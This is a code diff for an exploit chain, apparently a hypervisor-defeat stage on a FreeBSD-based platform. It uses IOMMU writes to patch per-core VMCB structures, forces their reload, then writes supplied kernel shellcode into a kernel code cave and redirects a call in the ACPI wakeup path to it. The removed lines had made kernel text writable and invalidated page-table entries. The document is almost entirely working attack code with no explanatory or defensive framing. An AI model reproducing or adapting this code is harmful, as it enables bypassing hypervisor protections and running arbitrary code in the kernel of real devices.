@@ -1,27 +1,35 @@
 #include "hv_defeat_0304.h"
 #include "config.h"
-#include "gpu.h"
 #include "iommu.h"
 #include "tmr.h"
 #include "utils.h"
-#include <fcntl.h>
 #include <setjmp.h>
 #include <signal.h>
 #include <stdio.h>
 
-uint64_t vmcb_pa[16];
+void hook_call_near(uint64_t hook, uint64_t dst) {
+  int64_t diff_call = dst - hook;
+  uint8_t new_instr[5];
+  new_instr[0] = 0xE8;
+  *((uint32_t *)&new_instr[1]) = (int32_t)(diff_call - 5);
+  kernel_copyin(new_instr, hook, 5);
+  DEBUG_PRINT("Instruction patched\n");
+}
 
-int hv_defeat_0304(void) {
+int hv_defeat_0304(void *shellcode_kernel, size_t shellcode_kernel_len) {
   if (stage1_tmr_relax())
     return -1;
   if (stage2_patch_vmcbs())
     return -1;
   if (stage3_force_vmcb_reload())
     return -1;
-  if (stage4_remove_xotext())
-    return -1;
-  if (stage5_kernel_pmap_invalidate_all())
-    return -1;
+
+  // Install shellcode.
+  uint64_t sck_va = ktext + env_offset.KERNEL_CODE_CAVE;
+  kwrite_large(sck_va, shellcode_kernel, shellcode_kernel_len);
+
+  hook_call_near(ktext + env_offset.HOOK_ACPI_WAKEUP_MACHDEP, sck_va);
+
   return 0;
 }
 
@@ -95,8 +103,7 @@ int stage2_patch_vmcbs(void) {
   pin_to_core(cur);
 
   for (int i = 0; i < 16; i++) {
-    vmcb_pa[i] = get_vmcb(i);
-    iommu_write8_pa(vmcb_pa[i] + 0x90, 0);
+    iommu_write8_pa(get_vmcb(i) + 0x90, 0);
   }
 
   pin_to_core(9);
@@ -137,63 +144,4 @@ int stage3_force_vmcb_reload(void) {
 
   // Return -1 if we didn't caught them
   return ret ? 0 : -1;
-}
-
-int stage4_remove_xotext(void) {
-  DEBUG_PRINT("\nHV-Defeat [stage4] xotext removal\n");
-
-  uint64_t start = ktext;
-  uint64_t end = kdata;
-  int n __attribute__((unused)) = 0;
-
-  for (uint64_t a = start; a < end; a += 0x1000) {
-    page_chain_set_rw(a);
-    n++;
-  }
-  DEBUG_PRINT("  %d pages on ktext\n", n);
-  return 0;
-}
-
-int stage5_kernel_pmap_invalidate_all(void) {
-  DEBUG_PRINT("HV-Defeat [stage5] invalidate paging entries\n");
-
-  static uint64_t two_zero_pages[PAGE_SIZE * 2] = {0};
-
-  int pipe_fds[2];
-
-  if (pipe2(pipe_fds, O_NONBLOCK)) {
-    return -1;
-  }
-
-  if (write(pipe_fds[1], two_zero_pages, PAGE_SIZE * 2) < 0) {
-    close(pipe_fds[0]);
-    close(pipe_fds[1]);
-    return -1;
-  }
-
-  close(pipe_fds[1]);
-
-  uint64_t read_fd_file_data = kernel_get_proc_file(-1, pipe_fds[0]);
-
-  if (!INKERNEL(read_fd_file_data)) {
-    close(pipe_fds[0]);
-    return -1;
-  }
-
-  uint64_t read_fd_buffer;
-  kernel_copyout(read_fd_file_data + 0x10, &read_fd_buffer,
-                 sizeof(read_fd_buffer));
-
-  if (!INKERNEL(read_fd_buffer)) {
-    close(pipe_fds[0]);
-    return -1;
-  }
-
-  if (!page_remove_global(read_fd_buffer)) {
-    close(pipe_fds[0]);
-    return -1;
-  }
-
-  close(pipe_fds[0]);
-  return 0;
 }
